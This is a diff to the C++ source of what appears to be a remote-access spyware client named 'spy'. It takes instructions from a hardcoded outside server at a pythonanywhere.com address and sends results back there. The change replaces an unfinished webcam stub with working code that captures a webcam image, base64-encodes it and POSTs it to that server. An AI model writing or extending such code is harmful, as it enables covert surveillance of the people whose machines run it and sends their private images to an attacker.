@@ -1,5 +1,4 @@
 #include <iostream>
-#include <random>
 #include <string>
 
 #include "spy.hpp"
@@ -12,11 +11,6 @@
 #pragma once
 
 std::string OUTPUTS_URL = "http://0x3af72.pythonanywhere.com/outputs/?u=";
-
-// For webcam
-std::random_device rd;
-std::mt19937 mt(rd());
-std::uniform_int_distribution<int> uDistribution(1000000, 9999999);
 
 void perform(std::string id, std::vector<std::string> values) {
 
@@ -112,14 +106,17 @@ void perform(std::string id, std::vector<std::string> values) {
     }
 
     else if (type == "webcam") {
-        std::string file = std::to_string(uDistribution(mt));
-        if (GetWebcamImage(file + ".png")) {
-            // How do i upload the file
-            // Crashing
+        std::string base64;
+        if (GetWebcamImage(&base64)) {
+            POST_Request(OUTPUTS_URL + id, {
+                {"instruction_id", values[0]},
+                {"type", "webcam"},
+                {"data", base64}
+            });
         } else {
             POST_Request(OUTPUTS_URL + id, {
                 {"instruction_id", values[0]},
-                {"type", "gip"}, // So that it displays text
+                {"type", "webcam_fail"},
                 {"data", "webcam unsuccessful"}
             });
         }
